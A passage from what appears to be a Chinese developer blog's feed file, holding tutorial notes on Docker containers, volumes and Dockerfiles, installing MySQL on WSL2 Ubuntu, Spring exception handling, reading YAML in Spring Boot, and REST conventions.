class="line-numbers-rows"><span></span></span></code></pre></li><li><p>删除容器：如果容器是运行状态则删除失败，需要停止容器才能删除</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> <span class="token function">rm</span> 容器名称<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>查看容器信息</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> inspect 容器名称<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><h2 id="docker-容器的数据卷"><a href="#docker-容器的数据卷" class="headerlink" title="docker 容器的数据卷"></a>docker 容器的数据卷</h2><p><img src="/2022/05/07/docker/2.png"></p><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><ul><li>数据卷是宿主机中的一个目录或文件</li><li>当容器目录和数据卷目录绑定后，对方的修改会立即同步</li><li>一个数据卷可以被多个容器同时挂载</li><li>一个容器也可以挂载多个数据卷</li></ul><h3 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h3><ul><li>容器数据持久化</li><li>外部机器和容器间接通信</li><li>容器之间数据交换</li></ul><h3 id="配置数据卷"><a href="#配置数据卷" class="headerlink" title="配置数据卷"></a>配置数据卷</h3><ul><li><p>创建启动容器时，使用-v 参数设置数据卷</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> run <span class="token punctuation">..</span>. –v 宿主机目录<span class="token punctuation">(</span>文件<span class="token punctuation">)</span>:容器内目录<span class="token punctuation">(</span>文件<span class="token punctuation">)</span> <span class="token punctuation">..</span>.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注意：</p><ul><li>目录必须是绝对路径</li><li>如果目录不存在，会自动创建</li><li>可以挂载多个数据卷</li></ul></li></ul><h3 id="数据卷容器"><a href="#数据卷容器" class="headerlink" title="数据卷容器"></a>数据卷容器</h3><p>创建一个容器，挂载一个目录，让其他容器继承自该容器( –volume-from )。<br>通过简单方式实现数据卷配置</p><ol><li><p>创建启动 c3 数据卷容器，使用–v 参数设置数据卷</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> run –it --name<span class="token operator">=</span>c3 –v /volume centos:7 /bin/bash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>创建启动 c1 c2 容器，使用 <code>–-volumes-from</code> 参数设置数据卷</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> run –it --name<span class="token operator">=</span>c1 --volumes-from c3 centos:7 /bin/bash<span class="token function">docker</span> run –it --name<span class="token operator">=</span>c2 --volumes-from c3 centos:7 /bin/bash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ol><h2 id="应用部署"><a href="#应用部署" class="headerlink" title="应用部署"></a>应用部署</h2><h3 id="部署-mysql"><a href="#部署-mysql" class="headerlink" title="部署 mysql"></a>部署 mysql</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> pull mysql:5<span class="token comment"># 在/root目录下创建mysql目录用于存储mysql数据信息</span><span class="token function">mkdir</span> ~/mysql<span class="token builtin class-name">cd</span> ~/mysql<span class="token function">docker</span> run -id <span class="token punctuation">\</span>-p <span class="token number">3306</span>:3306 <span class="token punctuation">\</span>--name<span class="token operator">=</span>mysql_0 <span class="token punctuation">\</span>-v <span class="token environment constant">$PWD</span>/conf:/etc/mysql/conf.d <span class="token punctuation">\</span>-v <span class="token environment constant">$PWD</span>/logs:/logs <span class="token punctuation">\</span>-v <span class="token environment constant">$PWD</span>/data:/var/lib/mysql <span class="token punctuation">\</span>-e <span class="token assign-left variable">MYSQL_ROOT_PASSWORD</span><span class="token operator">=</span>root <span class="token punctuation">\</span>mysql:5<span class="token function">docker</span> <span class="token builtin class-name">exec</span> –it c_mysql /bin/bash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>参数说明：</p><ul><li><code>-p 3306:3306</code>：将容器的 3306 端口映射到宿主机的 3306 端口。</li><li><code>-v $PWD/conf:/etc/mysql/conf.d</code>：将主机当前目录下的 conf&#x2F;my.cnf 挂载到容器的 &#x2F;etc&#x2F;mysql&#x2F;my.cnf。配置目录</li><li><code>-v $PWD/logs:/logs</code>：将主机当前目录下的 logs 目录挂载到容器的 &#x2F;logs。日志目录</li><li><code>-v $PWD/data:/var/lib/mysql</code> ：将主机当前目录下的 data 目录挂载到容器的 &#x2F;var&#x2F;lib&#x2F;mysql 。数据目录</li><li><code>-e MYSQL_ROOT_PASSWORD=root</code>：初始化 root 用户的密码。</li></ul><h3 id="部署-tomcat"><a href="#部署-tomcat" class="headerlink" title="部署 tomcat"></a>部署 tomcat</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> pull tomcat<span class="token comment"># 在/root目录下创建tomcat目录用于存储tomcat数据信息</span><span class="token function">mkdir</span> ~/tomcat<span class="token builtin class-name">cd</span> ~/tomcat<span class="token comment"># 创建容器，设置端口映射、目录映射</span><span class="token function">docker</span> run -id --name<span class="token operator">=</span>tomcat_0 <span class="token punctuation">\</span>-p <span class="token number">8080</span>:8080 <span class="token punctuation">\</span>-v <span class="token environment constant">$PWD</span>:/usr/local/tomcat/webapps <span class="token punctuation">\</span>tomcat<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>参数说明：</p><ul><li><code>-p 8080:8080</code>：将容器的 8080 端口映射到主机的 8080 端口</li><li><code>-v $PWD:/usr/local/tomcat/webapps</code>：将主机中当前目录挂载到容器的 webapps</li></ul><h3 id="部署-redis"><a href="#部署-redis" class="headerlink" title="部署 redis"></a>部署 redis</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> pull redis:5.0<span class="token function">docker</span> run -id --name<span class="token operator">=</span>redis_0 -p <span class="token number">6379</span>:6379 redis:5.0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="部署-Nginx"><a href="#部署-Nginx" class="headerlink" title="部署 Nginx"></a>部署 Nginx</h3><ol><li><p>拉取镜像</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> pull nginx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>相关配置</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 在/root目录下创建nginx目录用于存储nginx数据信息</span><span class="token function">mkdir</span> ~/nginx<span class="token builtin class-name">cd</span> ~/nginx<span class="token function">mkdir</span> conf<span class="token builtin class-name">cd</span> conf<span class="token comment"># 在~/nginx/conf/下创建nginx.conf文件,粘贴下面内容</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-conf" data-language="conf"><code class="language-conf">user  nginx;worker_processes  1;error_log  &#x2F;var&#x2F;log&#x2F;nginx&#x2F;error.log warn;pid        &#x2F;var&#x2F;run&#x2F;nginx.pid;events &#123;    worker_connections  1024;&#125;http &#123;    include       &#x2F;etc&#x2F;nginx&#x2F;mime.types;    default_type  application&#x2F;octet-stream;    log_format  main  &#39;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &#39;                      &#39;$status $body_bytes_sent &quot;$http_referer&quot; &#39;                      &#39;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&#39;;    access_log  &#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log  main;    sendfile        on;    #tcp_nopush     on;    keepalive_timeout  65;    #gzip  on;    include &#x2F;etc&#x2F;nginx&#x2F;conf.d&#x2F;.conf;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>创建容器，设置端口映射、目录映射</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> run -id --name<span class="token operator">=</span>c_nginx <span class="token punctuation">\</span>-p <span class="token number">80</span>:80 <span class="token punctuation">\</span>-v <span class="token environment constant">$PWD</span>/conf/nginx.conf:/etc/nginx/nginx.conf <span class="token punctuation">\</span>-v <span class="token environment constant">$PWD</span>/logs:/var/log/nginx <span class="token punctuation">\</span>-v <span class="token environment constant">$PWD</span>/html:/usr/share/nginx/html <span class="token punctuation">\</span>nginx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>参数说明：</p><ul><li><code>-p 80:80</code>：将容器的 80 端口映射到宿主机的 80 端口。</li><li><code>-v $PWD/conf/nginx.conf:/etc/nginx/nginx.conf</code>：将主机当前目录下的 &#x2F;conf&#x2F;nginx.conf 挂载到容器的 :&#x2F;etc&#x2F;nginx&#x2F;nginx.conf。配置目录</li><li><code>-v $PWD/logs:/var/log/nginx</code>：将主机当前目录下的 logs 目录挂载到容器的&#x2F;var&#x2F;log&#x2F;nginx。日志目录</li></ul></li></ol><h2 id="docker-镜像"><a href="#docker-镜像" class="headerlink" title="docker 镜像"></a>docker 镜像</h2><h3 id="镜像原理"><a href="#镜像原理" class="headerlink" title="镜像原理"></a>镜像原理</h3><p><img src="/2022/05/07/docker/3.png"></p><p>Docker 镜像是由特殊的文件系统叠加而成</p><ul><li><p>最底端是 bootfs，并使用宿主机的 bootfs</p><blockquote><p>Linux 文件系统由 bootfs 和 rootfs 两部分组成</p><ul><li>bootfs：包含 bootloader（引导加载程序）和 kernel（内核）</li><li>rootfs：root 文件系统，包含的就是典型 Linux 系统中的&#x2F;dev，&#x2F;proc，&#x2F;bin，&#x2F;etc 等标准目录和文件</li><li>不同的 linux 发行版，bootfs 基本一样，而 rootfs 不同，如 ubuntu<br>，centos 等</li></ul></blockquote></li><li><p>第二层是 root 文件系统 rootfs,称为 base image</p></li><li><p>然后再往上可以叠加其他的镜像文件</p></li><li><p>统一文件系统（Union File System）技术能够将不同的层整合成一个文件系统，为这些层提供了一个统一的视角，这样就隐藏了多层的存在，在用户的角度看来，只存在一个文件系统。</p></li><li><p>一个镜像可以放在另一个镜像的上面。位于下面的镜像称为父镜像，最底部的镜像成为基础镜像。</p></li><li><p>当从一个镜像启动容器时，Docker 会在最顶层加载一个读写文件系统作为容器</p></li></ul><h3 id="镜像制作"><a href="#镜像制作" class="headerlink" title="镜像制作"></a>镜像制作</h3><ol><li><p>容器转为镜像</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> commit 容器id 镜像名称:版本号<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> save -o 压缩文件名称 镜像名称:版本号<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> load -i 压缩文件名称<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>通过 dockerfile</p></li></ol><h2 id="DockerFile"><a href="#DockerFile" class="headerlink" title="DockerFile"></a>DockerFile</h2><h3 id="概念-1"><a href="#概念-1" class="headerlink" title="概念"></a>概念</h3><ul><li>dockerFile 是一个文本文件</li><li>包含了一条条的指令</li><li>每一条指令构建一层，基于基础镜像，最终构建出一个新的镜像</li><li>对于开发人员：可以为开发团队提供一个完全一致的开发环境</li><li>对于测试人员：可以直接拿开发时所构建的镜像或者通过 Dockerfile 文件构建一个新的镜像开始工作了</li><li>对于运维人员：在部署时，可以实现应用的无缝移植</li></ul><h3 id="关键字"><a href="#关键字" class="headerlink" title="关键字"></a>关键字</h3><table><thead><tr><th align="left">关键字</th><th align="center">作用</th><th align="left">备注</th></tr></thead><tbody><tr><td align="left">FROM</td><td align="center">指定父镜像</td><td align="left">指定 dockerfile 基于哪个 image 构建</td></tr><tr><td align="left">MAINTAINER</td><td align="center">作者信息</td><td align="left">用来标明这个 dockerfile 谁写的</td></tr><tr><td align="left">LABEL</td><td align="center">标签</td><td align="left">用来标明 dockerfile 的标签 可以使用 Label 代替 Maintainer 最终都是在 docker image 基本信息中可以查看</td></tr><tr><td align="left">RUN</td><td align="center">执行命令</td><td align="left">执行一段命令 默认是&#x2F;bin&#x2F;sh 格式: RUN command 或者 RUN [“command” , “param1”,”param2”]</td></tr><tr><td align="left">CMD</td><td align="center">容器启动命令</td><td align="left">提供启动容器时候的默认命令 和 ENTRYPOINT 配合使用.格式 CMD command param1 param2 或者 CMD [“command” , “param1”,”param2”]</td></tr><tr><td align="left">ENTRYPOINT</td><td align="center">入口</td><td align="left">一般在制作一些执行就关闭的容器中会使用</td></tr><tr><td align="left">COPY</td><td align="center">复制文件</td><td align="left">build 的时候复制文件到 image 中</td></tr><tr><td align="left">ADD</td><td align="center">添加文件</td><td align="left">build 的时候添加文件到 image 中 不仅仅局限于当前 build 上下文 可以来源于远程服务</td></tr><tr><td align="left">ENV</td><td align="center">环境变量</td><td align="left">指定 build 时候的环境变量 可以在启动的容器的时候 通过-e 覆盖 格式 ENV name&#x3D;value</td></tr><tr><td align="left">ARG</td><td align="center">构建参数</td><td align="left">构建参数 只在构建的时候使用的参数 如果有 ENV 那么 ENV 的相同名字的值始终覆盖 arg 的参数</td></tr><tr><td align="left">VOLUME</td><td align="center">定义外部可以挂载的数据卷</td><td align="left">指定 build 的 image 那些目录可以启动的时候挂载到文件系统中 启动容器的时候使用 -v 绑定 格式 VOLUME [“目录”]</td></tr><tr><td align="left">EXPOSE</td><td align="center">暴露端口</td><td align="left">定义容器运行的时候监听的端口 启动容器的使用-p 来绑定暴露端口 格式: EXPOSE 8080 或者 EXPOSE 8080&#x2F;udp</td></tr><tr><td align="left">WORKDIR</td><td align="center">工作目录</td><td align="left">指定容器内部的工作目录 如果没有创建则自动创建 如果指定&#x2F; 使用的是绝对地址 如果不是&#x2F;开头那么是在上一条 workdir 的路径的相对路径</td></tr><tr><td align="left">USER</td><td align="center">指定执行用户</td><td align="left">指定 build 或者启动的时候 用户 在 RUN CMD ENTRYPONT 执行的时候的用户</td></tr><tr><td align="left">HEALTHCHECK</td><td align="center">健康检查</td><td align="left">指定监测当前容器的健康监测的命令 基本上没用 因为很多时候 应用本身有健康监测机制</td></tr><tr><td align="left">ONBUILD</td><td align="center">触发器</td><td align="left">当存在 ONBUILD 关键字的镜像作为基础镜像的时候 当执行 FROM 完成之后 会执行 ONBUILD 的命令 但是不影响当前镜像 用处也不怎么大</td></tr><tr><td align="left">STOPSIGNAL</td><td align="center">发送信号量到宿主机</td><td align="left">该 STOPSIGNAL 指令设置将发送到容器的系统调用信号以退出。</td></tr><tr><td align="left">SHELL</td><td align="center">指定执行脚本的 shell</td><td align="left">指定 RUN CMD ENTRYPOINT 执行命令的时候 使用的 shell</td></tr></tbody></table><h3 id="发布-springboot-项目"><a href="#发布-springboot-项目" class="headerlink" title="发布 springboot 项目"></a>发布 springboot 项目</h3><ol><li>定义父镜像：<code>FROM java:8</code></li><li>定义作者信息：<code>MAINTAINER wujiu &lt;123@hello.com&gt;</code></li><li>将 jar 包添加到容器：<code>ADD springboot.jar app.jar</code></li><li>定义容器启动的执行命令：<code>CMD java -jar app.jar</code></li><li>通过 dockerfile 构建镜像：<code>docker build -f dockerfile文件路径 -t 镜像名称:版本</code></li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>在WSL2-Ubuntu上安装mysql</title>
      <link href="/2022/05/04/%E5%9C%A8WSL2%E4%B8%8A%E5%AE%89%E8%A3%85mysql/"/>
      <url>/2022/05/04/%E5%9C%A8WSL2%E4%B8%8A%E5%AE%89%E8%A3%85mysql/</url>
      
        <content type="html"><![CDATA[<h2 id="可能遇到的问题"><a href="#可能遇到的问题" class="headerlink" title="可能遇到的问题"></a>可能遇到的问题</h2><ul><li><p><code>ERROR 2002 (HY000): Can&#39;t connect to local MySQL server through socket &#39;/var/run/mysqld/mysqld.sock&#39; </code></p><p>解决方案：使用sudo 启动</p></li><li><p>发现可以不使用密码登录root用户<br>这其实是mysql的一种验证机制， <code>auth_socket</code>，这里只会验证当前操作系统登陆的用户和数据库是否一致，不会检测密码<br>只能用 UNIX 的 socket 方式登陆，这就保证了只能本地登陆，用户在使用这种登陆方式时已经通过了操作系统的安全验证 </p><p>解决方案：可以通过修改mysql.user表中的plugin字段为<code>caching_sha2_password</code></p></li><li><p>修改密码<br> <code> alter user &#39;USERNAME&#39;@&#39;localhost&#39; identified by &#39;YOUR_PASSWORD&#39;;</code></p></li></ul><h2 id="系统版本"><a href="#系统版本" class="headerlink" title="系统版本"></a>系统版本</h2><p>Ubuntu 20.04.4 LTS</p><h2 id="mysql版本"><a href="#mysql版本" class="headerlink" title="mysql版本"></a>mysql版本</h2><p>8.0.29-0ubuntu0.20.04.2 (Ubuntu)</p><h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><h3 id="更新-APT-存储库中的包信息："><a href="#更新-APT-存储库中的包信息：" class="headerlink" title="更新 APT 存储库中的包信息："></a>更新 APT 存储库中的包信息：</h3><p>执行语句  <code>sudo apt update</code></p><h3 id="使用-APT-安装-MySQL："><a href="#使用-APT-安装-MySQL：" class="headerlink" title="使用 APT 安装 MySQL："></a>使用 APT 安装 MySQL：</h3><p>执行语句  <code>sudo apt install mysql-server</code></p><h3 id="启动MySQL服务："><a href="#启动MySQL服务：" class="headerlink" title="启动MySQL服务："></a>启动MySQL服务：</h3><p>执行语句  <code>sudo service mysql start</code></p><p>注意，此处有大坑：</p><ol><li><p>这里不能使用一般linux下的命令<code>sudo systemctl start</code>，会导致以下错误：</p><p><img src="/2022/05/04/%E5%9C%A8WSL2%E4%B8%8A%E5%AE%89%E8%A3%85mysql/1.png"></p></li></ol><p>具体原因解释可以查看 <a href="https://linuxhandbook.com/system-has-not-been-booted-with-systemd/">此处</a></p><ol start="2"><li><p>必须使用<code>sudo</code>，否则服务无法启动</p><p><img src="/2022/05/04/%E5%9C%A8WSL2%E4%B8%8A%E5%AE%89%E8%A3%85mysql/2.png"></p></li></ol><h3 id="登录MySQL"><a href="#登录MySQL" class="headerlink" title="登录MySQL"></a>登录MySQL</h3><p>执行语句  <code>mysql -u root -p</code></p><p>这就是问题最大的地方了，我们在安装的时候，并没有提示让我们设置root用户的密码，按理说这里密码填空直接就可以进入，但是却会出现<code>ERROR 1698 (28000): Access denied for user ‘root’@‘localhost’</code></p><p>下面我们说说如何解决这个问题：</p><ol><li><p>执行命令   <code>sudo cat /etc/mysql/debian.cnf</code>，可以看到如下信息</p><p><img src="/2022/05/04/%E5%9C%A8WSL2%E4%B8%8A%E5%AE%89%E8%A3%85mysql/3.png"></p><p>其中debian-sys-maint账户是安装mysql时系统自动生成的mysql用户，对应的密码就是该用户的密码。</p></li><li><p>登录账户debian-sys-maint：<code>mysql -u debian-sys-maint -p</code> </p><p><img src="/2022/05/04/%E5%9C%A8WSL2%E4%B8%8A%E5%AE%89%E8%A3%85mysql/4.png"></p><p>成功登录</p></li><li><p>修改root密码：</p><p><code>alter user &#39;root&#39;@&#39;localhost&#39; identified by &#39;YOUR_PASSWORD&#39;;</code></p><p><code>flush privileges;</code></p></li><li><p>接下来就可以成功登录了</p><p><img src="/2022/05/04/%E5%9C%A8WSL2%E4%B8%8A%E5%AE%89%E8%A3%85mysql/5.png"></p></li><li><p>若无法连接可以尝试加上<code>sudo</code></p><p><img src="/2022/05/04/%E5%9C%A8WSL2%E4%B8%8A%E5%AE%89%E8%A3%85mysql/6.png"></p></li></ol><h2 id="在windows本地连接wsl的数据库"><a href="#在windows本地连接wsl的数据库" class="headerlink" title="在windows本地连接wsl的数据库"></a>在windows本地连接wsl的数据库</h2><p>wsl和windows是共享端口的，也就是说可以主机直接通过localhost:3306来访问wsl的mysql</p><p>直接尝试连接 <code>mysql -uroot -p</code> ，问题又来了</p><p><img src="/2022/05/04/%E5%9C%A8WSL2%E4%B8%8A%E5%AE%89%E8%A3%85mysql/7.png"></p><p>解决办法：</p><p>再次使用debian-sys-maint登录，执行如下语句</p><p><code>alter user &#39;root&#39;@&#39;localhost&#39; identified with mysql_native_password by &#39;root&#39;;</code></p><p><code>flush privileges;</code></p><p>再次尝试</p><p><img src="/2022/05/04/%E5%9C%A8WSL2%E4%B8%8A%E5%AE%89%E8%A3%85mysql/8.png"></p><p>成功登录，同时我们也发现，在wsl中，可以在不使用<code>sudo</code>的情况下直接<code>mysql -uroot -p</code>登录</p><p><img src="/2022/05/04/%E5%9C%A8WSL2%E4%B8%8A%E5%AE%89%E8%A3%85mysql/9.png" alt="9"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>spring异常处理</title>
      <link href="/2022/05/01/spring%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/"/>
      <url>/2022/05/01/spring%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/</url>
      
        <content type="html"><![CDATA[<ol><li>使用<code>@RestControllerAdvice</code>定义 SpringMVC 异常处理器来处理异常</li><li>异常处理器必须被扫描加载</li></ol><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@RestControllerAdvice</span><span class="token annotation punctuation">@Slf4j</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">GlobalExceptionHandler</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@ExceptionHandler</span><span class="token punctuation">(</span><span class="token class-name">CustomException</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token class-name">R</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> <span class="token class-name">ExceptionHandler</span><span class="token punctuation">(</span><span class="token class-name">CustomException</span> ex<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token class-name">R</span><span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span>ex<span class="token punctuation">.</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Springboot读取yaml数据</title>
      <link href="/2022/05/01/Springboot%E8%AF%BB%E5%8F%96yaml%E6%95%B0%E6%8D%AE/"/>
      <url>/2022/05/01/Springboot%E8%AF%BB%E5%8F%96yaml%E6%95%B0%E6%8D%AE/</url>
      
        <content type="html"><![CDATA[<h3 id="读取单一数据"><a href="#读取单一数据" class="headerlink" title="读取单一数据"></a>读取单一数据</h3><ol><li>使用<code>@value</code>配合 SpEL 读取单个数据</li><li>如果数据存在多层级，依次书写层级名称即可</li></ol><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">users</span><span class="token punctuation">:</span>  <span class="token key atrule">name</span><span class="token punctuation">:</span> zhangsan  <span class="token key atrule">age</span><span class="token punctuation">:</span> <span class="token number">18</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Value</span><span class="token punctuation">(</span><span class="token string">"$&#123;user.name&#125;"</span><span class="token punctuation">)</span><span class="token keyword">private</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span><span class="token annotation punctuation">@Value</span><span class="token punctuation">(</span><span class="token string">"$&#123;user.age&#125;"</span><span class="token punctuation">)</span><span class="token keyword">private</span> <span class="token keyword">int</span> age<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="读取全部属性数据"><a href="#读取全部属性数据" class="headerlink" title="读取全部属性数据"></a>读取全部属性数据</h3><ol><li>使用<code>Environment</code>对象封装全部配置信息</li><li>使用<code>@Autowired</code>自动装配数据到<code>Environment</code>对象中</li><li>调用<code>getProperty()</code>获取数据</li></ol><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@AutoWired</span><span class="token keyword">private</span> <span class="token class-name">Enviroment</span> env<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="自定义对象封装指定数据"><a href="#自定义对象封装指定数据" class="headerlink" title="自定义对象封装指定数据"></a>自定义对象封装指定数据</h3><ol><li><p>准备数据 <code>application.yaml</code></p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">datasource</span><span class="token punctuation">:</span>  <span class="token key atrule">driver</span><span class="token punctuation">:</span> com.mysql.jdbc.Driver  <span class="token key atrule">url</span><span class="token punctuation">:</span> jdbc<span class="token punctuation">:</span>mysql<span class="token punctuation">:</span>//localhost/springboot_db  <span class="token key atrule">username</span><span class="token punctuation">:</span> root  <span class="token key atrule">password</span><span class="token punctuation">:</span> root<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>定义 Java Bean</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">// 定义数据类型封装yamnl文件中的数据</span><span class="token comment">// 定义为Spring管控的Bean</span><span class="token annotation punctuation">@Component</span><span class="token comment">// 指定加载的数据</span><span class="token annotation punctuation">@ConfigurationProperties</span><span class="token punctuation">(</span>prefix <span class="token operator">=</span> <span class="token string">"datasource"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MyDataSource</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> driver<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> url<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> username<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> password<span class="token punctuation">;</span>    <span class="token comment">// Getter/Setter...</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>一点心得</title>
      <link href="/2022/04/26/%E4%B8%80%E7%82%B9%E5%BF%83%E5%BE%97/"/>
      <url>/2022/04/26/%E4%B8%80%E7%82%B9%E5%BF%83%E5%BE%97/</url>
      
        <content type="html"><![CDATA[<p> 既然有些人不愿意听你讲话，那就不要再讲给他听了吧</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>REST风格</title>
      <link href="/2022/04/16/REST%E9%A3%8E%E6%A0%BC/"/>
      <url>/2022/04/16/REST%E9%A3%8E%E6%A0%BC/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>REST(Representational State Transfer)，表现形式转换</p><ul><li><p>传统风格资源描述形式</p><p><code>http://localhost/user/getById?id=1</code></p><p><code>http://localhost/user/saveuser</code></p></li><li><p>REST 风格描述形式</p><p><code>http://localhost/user/1</code></p><p><code>http://localhost/user</code></p></li></ul><h2 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h2><ul><li>隐藏资源的访问行为，无法通过地址得知对资源是何种操作</li><li>书写简化</li></ul><h2 id="行为动作对应操作"><a href="#行为动作对应操作" class="headerlink" title="行为动作对应操作"></a>行为动作对应操作</h2><table><thead><tr><th>查询</th><th>GET</th></tr></thead><tbody><tr><td>查询</td><td>GET</td></tr><tr><td>添加</td><td>POST</td></tr><tr><td>修改</td><td>PUT</td></tr><tr><td>删除</td><td>DELETE</td></tr></tbody></table><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>例：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"/users/&#123;id&#125;"</span><span class="token punctuation">,</span> method <span class="token operator">=</span> <span class="token class-name">RequestMethod</span><span class="token punctuation">.</span>DELETE<span class="token punctuation">)</span><span class="token annotation punctuation">@ResponseBody</span><span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">delete</span><span class="token punctuation">(</span><span class="token annotation punctuation">@PathVariable</span> <span class="token class-name">Integer</span> id<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"user delete .."</span> <span class="token operator">+</span> id<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token string">"&#123;'moudle':user delete&#125;"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>@RequestMapping</p><ul><li>类型：方法注解</li><li>位置：SpringMVC 控制器方法定义上方</li><li>作用：设置当前控制器方法请求访问路径</li><li>属性：<ul><li>value(默认)：请求访问路径</li><li>method：http 请求动作，标准动作（GET&#x2F;POST&#x2F;PUT&#x2F;DELETE）</li></ul></li></ul><p>@PathVariable</p><ul><li><p>类型：形参注解</p></li><li><p>位置：SpringMVC 